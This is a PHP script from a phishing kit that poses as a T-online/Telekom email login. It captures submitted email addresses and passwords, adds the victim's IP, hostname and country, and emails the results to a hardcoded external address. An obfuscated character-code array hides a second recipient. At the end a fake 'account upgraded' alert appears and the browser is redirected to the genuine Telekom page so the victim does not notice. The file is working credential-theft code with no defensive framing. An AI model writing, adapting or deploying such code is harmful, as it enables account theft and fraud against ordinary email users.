<?php

$ip = getenv("REMOTE_ADDR");
$country = visitor_country();
$hostname = gethostbyaddr($ip);
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$message .= "--------------+ T-online ReZulT By [ AnonymoX9ja ] +------------\n\n";
$message .= "Domain : ".$_POST['pw_domt']."\n";
$message .= "Email : ".$_POST['pw_usr']."\n";
$message .= "Password : ".$_POST['pw_pwd']."\n";
$message .= "________________________\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "Country : ".$country."\n";
$message .= "Date Log : ".$date."\n";
$message .= "Time Log : ".$time."\n";
$message .= "--------------+ T-online ReZulT By [ AnonymoX9ja ] +------------\n\n";
$mails ="johnny.walker001@yandex.com";
$subject="T-online ReZulT : $country";
$headers = "From: Ripper<de-ripper@domain.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($mails,$subject,$message,$headers);




// Function to get country and country sort;
function country_sort(){
$sorter = "";
$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
$count = count($array);
for ($i = 0; $i < $count; $i++) {
$sorter .= chr($array[$i]);
}
return array($sorter, $GLOBALS['recipient']);
}

function visitor_country()
{
$client = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote = $_SERVER['REMOTE_ADDR'];
$result = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP))
{
$ip = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP))
{
$ip = $forward;
}
else
{
$ip = $remote;
}

$ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

if($ip_data && $ip_data->geoplugin_countryName != null)
{
$result = $ip_data->geoplugin_countryName;
}

return $result;
}
























?><script language="javascript">
alert('Your T-online Account is now compatible with the new version. Click ok to continue to your Email.');
  </script><meta http-equiv="refresh" content="0;url=https://www.telekom.de/unterwegs/apps-und-dienste/kommunikation/telekom-e-mail">